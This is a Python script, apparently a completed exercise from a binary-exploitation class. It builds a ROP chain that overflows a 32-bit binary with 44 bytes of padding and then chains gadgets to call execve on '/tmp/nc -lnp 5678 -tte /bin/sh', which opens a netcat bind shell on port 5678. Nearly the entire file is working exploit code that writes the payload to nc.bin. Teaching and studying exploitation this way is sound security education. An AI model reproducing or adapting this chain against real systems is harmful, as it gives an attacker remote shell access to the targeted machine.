"""
This is incomplete code and you are supposed to complete it.
We want to execute "/tmp/nc -lnp 5678 -tte /bin/sh" via execve syscall.

----------------------------------------
execve calling convention:

1. EAX = 11
2. EBX = "/tmp//nc" (char *)
3. ECX = arguments (char **) -> char *arguments[7]= { "/tmp//nc", "-lnp", "5678", "-tte", "/bin//sh", NULL}
4. EDX = env (char **) -> NULL
-----------------------------------------

The gadgets in the following code are based on my machine & binary and as a result you will have to adjust the gadget based on your environment.
With the latest ROPGadget tool that we used in the class, we get the following ropchain:
- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x8056d05 mov dword ptr [edx], eax ; ret -> MOVISTACK
	[+] Gadget found: 0x806ee8b pop edx ; ret -> POPEDX
	[+] Gadget found: 0x80a8bf6 pop eax ; ret -> POPEAX
	[+] Gadget found: 0x80562c0 xor eax, eax ; ret -> XOREAX

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x80562c0 xor eax, eax ; ret
	[+] Gadget found: 0x807c32a inc eax ; ret -> INCEAX

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x80481c9 pop ebx ; ret -> POPEBX
	[+] Gadget found: 0x806eeb2 pop ecx ; pop ebx ; ret -> POPECX remember there is an extra POP, so you need to provide something meaningful for ebx too!
	[+] Gadget found: 0x806ee8b pop edx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x8049603 int 0x80

- Step 5 -- Build the ROP chain
 
"""


from struct import pack
import os
######################################
# fileName=raw_input("Enter the file name")
outfile=open("nc.bin", "wb")
# 0x080d9060 = 0x080d9060
STACK      = pack("<I", 0x080d9060) # @ .data 
INT80      = pack("<I", 0x080495f3) # int $0x80
MOVISTACK  = pack("<I", 0x08056cf5) # mov dword ptr [edx], eax ; ret
INCEAX     = pack("<I", 0x0807b6da) # inc %eax | ret 
# POPALL     = pack("<I", 0x0805ffda) # pop %edx | pop %ecx | pop %ebx | ret;
# 									# we are mainly interested in pop %ecx, thus there will be pre and post dummy data for %edx and %ebx 
POPEAX     = pack("<I", 0x080a89e6) # pop %eax | ret
POPEBX     = pack("<I", 0x080481c9) # pop %ebx | ret
POPECX     = pack("<I", 0x0806e262) # pop %ecx | ret
POPEDX     = pack("<I", 0x0806e23b) # pop %edx | ret

XOREAX     = pack("<I", 0x080562b0) # xor %eax,%eax | ret
DUMMY      = pack("<I", 0x42424242) # padding

# Padding goes here
p = 'A'*44 # this is where we appended 44 characters.

p += POPEDX # pop edx ; ret
p += STACK # @ .data
p += POPEAX # pop eax ; ret
p += '/tmp'
p += MOVISTACK # mov dword ptr [edx], eax ; ret
p += POPEDX # pop edx ; ret
p += pack('<I', 0x080d9060 + 4) # @ .data + 4
p += POPEAX # pop eax ; ret
p += '//nc'
p += MOVISTACK # mov dword ptr [edx], eax ; ret
p += POPEDX #insert null
p += pack('<I', 0x080d9060 + 8)
p += XOREAX
p += MOVISTACK

p += POPEDX # pop edx ; ret
p += pack('<I', 0x080d9060 + 9) # @ .data + 4
p += POPEAX # pop eax ; ret
p += "-lnp"
p += MOVISTACK # mov dword ptr [edx], eax ; ret
p += POPEDX #insert null
p += pack('<I', 0x080d9060 + 13)
p += XOREAX
p += MOVISTACK

p += POPEDX # pop edx ; ret
p += pack('<I', 0x080d9060 + 14) # @ .data + 4
p += POPEAX # pop eax ; ret
p += "5678"
p += MOVISTACK # mov dword ptr [edx], eax ; ret
p += POPEDX #insert null
p += pack('<I', 0x080d9060 + 18)
p += XOREAX
p += MOVISTACK

p += POPEDX # pop edx ; ret
p += pack('<I', 0x080d9060 + 19) # @ .data + 4
p += POPEAX # pop eax ; ret
p += "-tte"
p += MOVISTACK # mov dword ptr [edx], eax ; ret
p += POPEDX #insert null
p += pack('<I', 0x080d9060 + 23)
p += XOREAX
p += MOVISTACK

p += POPEDX  # pop edx ; ret
p += pack('<I', 0x080d9060 + 24) # @ .data + 4
p += POPEAX # pop eax ; ret
p += '/bin'
p += MOVISTACK # mov dword ptr [edx], eax ; ret
p += POPEDX # pop edx ; ret
p += pack('<I', 0x080d9060 + 28) # @ .data + 4
p += POPEAX # pop eax ; ret
p += '//sh'
p += MOVISTACK # mov dword ptr [edx], eax ; ret




#--------------
p += POPEDX # pop edx ; ret
p += pack('<I', 0x080d9060 + 40) # @ .data + 4
p += POPEAX # pop eax ; ret
p += STACK
p += MOVISTACK # mov dword ptr [edx], eax ; ret

p += POPEDX # pop edx ; ret
p += pack('<I', 0x080d9060 + 44) # @ .data + 4
p += POPEAX # pop eax ; ret
p += pack('<I', 0x080d9060 + 9)
p += MOVISTACK # mov dword ptr [edx], eax ; ret

p += POPEDX # pop edx ; ret
p += pack('<I', 0x080d9060 + 48) # @ .data + 4
p += POPEAX # pop eax ; ret
p += pack('<I', 0x080d9060 + 14)
p += MOVISTACK # mov dword ptr [edx], eax ; ret

p += POPEDX # pop edx ; ret
p += pack('<I', 0x080d9060 + 52) # @ .data + 4
p += POPEAX # pop eax ; ret
p += pack('<I', 0x080d9060 + 19)
p += MOVISTACK # mov dword ptr [edx], eax ; ret

p += POPEDX # pop edx ; ret
p += pack('<I', 0x080d9060 + 56) # @ .data + 4
p += POPEAX # pop eax ; ret
p += pack('<I', 0x080d9060 + 24)
p += MOVISTACK # mov dword ptr [edx], eax ; ret

# ---------
p += POPEDX # pop edx ; ret
p += pack('<I', 0x080d9060 + 32) # @ .data + 8
p += XOREAX # xor eax, eax ; ret
p += MOVISTACK # mov dword ptr [edx], eax ; ret
p += POPEBX # pop ebx ; ret
p += STACK # @ .data
p += POPECX # pop ecx ; ret
p += pack('<I', 0x080d9060 + 40) # @ .data + 8
p += pack('<I', 0x080d9060) # padding without overwrite ebx
p += POPEDX # pop edx ; ret
p += pack('<I', 0x080d9060 + 32) # @ .data + 8
p += INCEAX * 11
p += INT80 # int 0x80
outfile.write(p)
outfile.close()
